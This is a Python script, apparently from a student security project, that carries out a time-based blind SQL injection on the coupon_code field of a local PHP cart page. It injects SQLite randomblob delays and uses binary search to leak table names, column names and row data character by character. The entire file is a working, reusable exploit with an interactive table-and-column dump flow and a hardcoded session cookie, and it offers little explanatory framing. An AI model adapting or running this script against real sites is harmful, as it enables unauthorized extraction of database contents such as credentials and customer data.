import requests
import time

URL = "http://localhost/CyberProject/cart.php"
COOKIES = {'PHPSESSID': '82reb4vqs953kqhnm8ull3r0am'}
# Binary search bounds over printable ASCII (space..~)
CHAR_LO = 32
CHAR_HI = 126

def get_baseline():
    print("[+] Measuring server baseline response time...")
    try:
        start = time.time()
        requests.post(URL, data={"coupon_code": "test", "apply_coupon": "1"}, cookies=COOKIES)
        return time.time() - start
    except Exception as e:
        print(f"[!] Baseline measurement failed: {e}")
        return 0.1

def check_condition_time(payload, baseline):
    # we added randomblob to make the server slower so we will know we have SQL injection
    time_delay_query = f"CASE WHEN ({payload}) THEN randomblob(250000000) ELSE 1 END"
    
    data = {
        "coupon_code": f"' OR ({time_delay_query}) --",
        "apply_coupon": "1"
    }
    
    start = time.time()
    try:
        requests.post(URL, data=data, cookies=COOKIES)
        duration = time.time() - start
        return duration > (baseline + 0.5)
    except Exception as e:
        return False

def leak_string(source_query, baseline, label):
    """Generic char-by-char leaker using binary search on UNICODE() of each position."""
    discovered = ""
    pos = 1
    while True:
        # Is there still a character at this position?
        if not check_condition_time(f"LENGTH(({source_query})) >= {pos}", baseline):
            break

        # Binary search the ASCII code of the char at `pos`.
        lo, hi = CHAR_LO, CHAR_HI
        while lo < hi:
            mid = (lo + hi) // 2
            payload = f"UNICODE(SUBSTR(({source_query}), {pos}, 1)) > {mid}"
            if check_condition_time(payload, baseline):
                lo = mid + 1
            else:
                hi = mid

        char = chr(lo)
        discovered += char
        print(f"  [{label}] pos {pos}: {char} -> {discovered}")
        pos += 1
    return discovered


def discover_all_tables(baseline):
    print("[+] Enumerating ALL table names from sqlite_master...")
    tables = []
    offset = 0
    while True:
        source = (
            f"SELECT name FROM sqlite_master WHERE type='table' "
            f"LIMIT 1 OFFSET {offset}"
        )
        name = leak_string(source, baseline, f"TABLE {offset}")
        if not name:
            break
        tables.append(name)
        offset += 1
    return tables


def discover_columns(table, baseline):
    print(f"[+] Enumerating columns of '{table}' via pragma_table_info...")
    columns = []
    offset = 0
    while True:
        # pragma_table_info is a table-valued function in SQLite; the table name
        # is a literal so we can plug the discovered name in directly.
        source = (
            f"SELECT name FROM pragma_table_info('{table}') "
            f"LIMIT 1 OFFSET {offset}"
        )
        name = leak_string(source, baseline, f"COL {offset}")
        if not name:
            break
        columns.append(name)
        offset += 1
    return columns


def leak_data_unlimited(table, column, baseline):
    print(f"\n[+] Dumping first row of {table}.{column}...")
    source = f"SELECT {column} FROM {table} LIMIT 1"
    return leak_string(source, baseline, "DATA")


def pick_from(items, prompt):
    for i, name in enumerate(items):
        print(f"  [{i}] {name}")
    raw = input(prompt).strip()
    if not raw.isdigit() or not (0 <= int(raw) < len(items)):
        return None
    return items[int(raw)]


if __name__ == "__main__":
    baseline_time = get_baseline()
    if baseline_time == 0:
        baseline_time = 0.1
    print(f"[+] Baseline: {baseline_time:.2f}s. Threshold: {(baseline_time + 0.5):.2f}s")

    tables = discover_all_tables(baseline_time)
    if not tables:
        print("\n[!] Failed to discover any tables.")
        raise SystemExit(1)

    print(f"\n[!] Discovered {len(tables)} table(s): {', '.join(tables)}")
    target_table = pick_from(tables, "Pick a table index to enumerate (or anything else to quit): ")
    if not target_table:
        print("\n[.] Attack aborted by user.")
        raise SystemExit(0)

    columns = discover_columns(target_table, baseline_time)
    if not columns:
        print(f"\n[!] No columns discovered for '{target_table}'.")
        raise SystemExit(1)

    print(f"\n[!] '{target_table}' columns: {', '.join(columns)}")
    target_column = pick_from(columns, "Pick a column index to dump (or anything else to quit): ")
    if not target_column:
        print("\n[.] Attack aborted by user.")
        raise SystemExit(0)

    extracted = leak_data_unlimited(target_table, target_column, baseline_time)
    if extracted:
        print(f"\n[SUCCESS] {target_table}.{target_column}[0] = {extracted}")
    else:
        print("\n[!] Failed to extract data content.")